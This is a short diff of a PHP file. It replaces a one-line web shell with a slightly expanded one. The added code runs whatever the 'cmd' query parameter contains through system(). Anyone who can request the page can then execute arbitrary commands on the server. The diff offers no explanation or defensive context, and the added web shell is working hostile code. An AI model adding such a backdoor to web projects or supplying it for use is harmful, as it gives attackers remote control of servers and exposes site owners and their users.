@@ -1,1 +1,6 @@
-<?php system($_GET[‘c’]);?>
+<?php
+if(isset($_GET['cmd']))
+{
+system($_GET['cmd']);
+}
+?>
